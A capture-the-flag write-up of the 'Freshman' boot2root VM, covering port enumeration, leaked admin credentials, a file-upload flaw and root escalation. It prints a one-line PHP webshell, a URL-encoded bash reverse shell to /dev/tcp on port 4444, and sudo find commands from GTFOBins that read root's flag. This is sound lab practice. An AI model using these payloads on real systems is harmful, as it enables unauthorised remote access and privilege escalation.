# Freshman

This is one of 2 Boot2Root questions for this CTF event. We are given a `.OVA` file, which I set up in VirtualBox.

<div align="center"><img src="https://github.com/user-attachments/assets/b5e98cf1-82e5-4711-9470-77ee157d9c34" alt="" width="563"></div>

***

## Enumeration

I started with a Nmap scan to detect all open ports.

<div align="center"><img src="https://github.com/user-attachments/assets/01ec9414-9847-4222-acfe-06f1412b1335" alt=""></div>

### FTP (Port 21) & MySQL (Port 3306)

<div align="center"><img src="https://github.com/user-attachments/assets/2b52468f-2c61-423d-a0ba-6b801219bfa0" alt="" width="563"></div>

<img src="https://github.com/user-attachments/assets/fb2c8c55-fa98-4496-96f2-a50da98cff6d" alt="" width="563">

FTP requires credentials and MySQL blocks my IP, probably limiting access to internal/web applications.

### HTTP (Port 80)

<div align="center"><img src="https://github.com/user-attachments/assets/545746f6-b4ab-46d9-80e1-cc9886fa0836" alt="" width="563"></div>

Navigating through the website brings us to a login page. I also performed some directory fuzzing.

<div align="center"><img src="https://github.com/user-attachments/assets/72949f7b-efc7-474e-b142-63335422a4c9" alt=""></div>

### HTTP (Port 8080)

<div align="center"><img src="https://github.com/user-attachments/assets/c901e710-3cf9-4ff3-b8ac-1ac19e52fd80" alt="" height="274" width="500"></div>

<img src="https://github.com/user-attachments/assets/6938f7db-915b-489a-8902-8b5fdbcbd89a" alt="" width="563">

Initially, this port only hosted the Nginx welcome page. After fuzzing, I discovered an `index.php` file that allows downloading the PHP source of the login page.

Inspecting it reveals admin credentials: **admin:admin**

<div align="center"><img src="https://github.com/user-attachments/assets/68a34021-3226-40f8-aa4b-49566186f615" alt="" width="375"></div>

Using these credentials, we can log into the Freshman Portal, which includes an assignment upload feature.

<div align="center"><img src="https://github.com/user-attachments/assets/ded90717-77d5-43a7-bd9a-488abb5aebfa" alt="" width="375"></div>

***

## Exploitation

First, I attempted to upload a PHP webshell:

```bash
<?php system($_GET['cmd']); ?>
```

<div align="center"><img src="https://github.com/user-attachments/assets/15d1fea1-8201-4b9e-adb3-12d53d15adfa" alt="" width="375"></div>

I then accessed the uploaded file:

<div align="center"><img src="https://github.com/user-attachments/assets/9136234c-dfff-4c7b-9b2f-1568dbd3e9c2" alt="" width="563"></div>

Great! we have RCE. For easier interaction, I spawned a reverse shell using:

```bash
cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/172.16.1.128/4444%200%3E%261%22
```

<div align="center"><img src="https://github.com/user-attachments/assets/fd4a131e-7972-49ef-98d9-8e2bacaed461" alt="image" width="563"></div>

After snooping around the webshell I found something in /tmp

<div align="center"><img src="https://github.com/user-attachments/assets/e593a7cc-2491-49fa-9ca4-497e70b129c5" alt="image" width="375"></div>

We have freshman's password. I tried to su in the webshell, but it didn't work. But the credentials did work in FTP. The flag file can be downloaded and decoded.

<div align="center"><img src="https://github.com/user-attachments/assets/21d91134-f326-4077-8bb7-48661a5ee4ec" alt="image" width="563"></div>

<img src="https://github.com/user-attachments/assets/4d0b7076-8401-4b9a-a08d-3e8d39239f8e" alt="image" width="563">

***

## Privelege Escalation

Since SSH is not open and we can't su in the webshell, we need to figure out another way to run commands as freshman and escalate to root. After looking at some PE vector online, I figured out that I can actually run commands as freshman through the webshell using this piped command:

```bash
echo 'freshman123' | su freshman -c "COMMAND"
```

<div align="center"><img src="https://github.com/user-attachments/assets/f0bcaeb3-1e96-4ed8-b3c1-6c9a451927c3" alt="image"></div>

NOPASWD on /usr/bin/find. I search for some payloads on GTFO bins and got this. `find . -exec /bin/sh \; -quit`.

<div align="center"><img src="https://github.com/user-attachments/assets/1016430c-eb11-48c4-bc24-b831b0e61a5b" alt="image"></div>

Hmm...didn't quite work. Instead of immediately trying to spawn a shell as root, I tried to run id first.

<div align="center"><img src="https://github.com/user-attachments/assets/07e7dace-2856-4cb8-b263-3f2d82e3d16b" alt="image"></div>

We can now run commands as root. Final payload: `echo 'freshman123' | su freshman -c "sudo find / -exec cat /root/root.txt \; -quit"`

<div align="center"><img src="https://github.com/user-attachments/assets/f139a9bd-a577-450a-b780-191a2d820c99" alt="image"></div>

<img src="https://github.com/user-attachments/assets/dfd397a1-2011-483c-95ce-5cc3eab751a1" alt="image" width="563">

We got the flag!
